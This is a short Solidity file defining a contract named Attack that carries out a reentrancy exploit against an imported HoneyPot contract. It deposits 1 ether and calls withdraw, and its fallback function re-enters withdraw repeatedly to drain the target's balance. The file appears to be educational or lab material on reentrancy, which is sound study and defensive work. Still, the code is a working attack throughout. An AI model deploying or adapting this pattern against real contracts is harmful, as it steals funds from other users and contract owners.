// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.8.2 <0.9.0;

import "./HoneyPot.sol";

contract Attack {
    HoneyPot public honeyPot;

    constructor(address _depositFundsAddress) {
        honeyPot = HoneyPot(_depositFundsAddress);
    }

    // Fallback is called when DepositFunds sends Ether to this contract.
    fallback() external payable {
        if (address(honeyPot).balance >= 1 ether) {
            honeyPot.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        honeyPot.deposit{value: 1 ether}();
        honeyPot.withdraw();
    }

    receive() external payable  { 
        
    }
}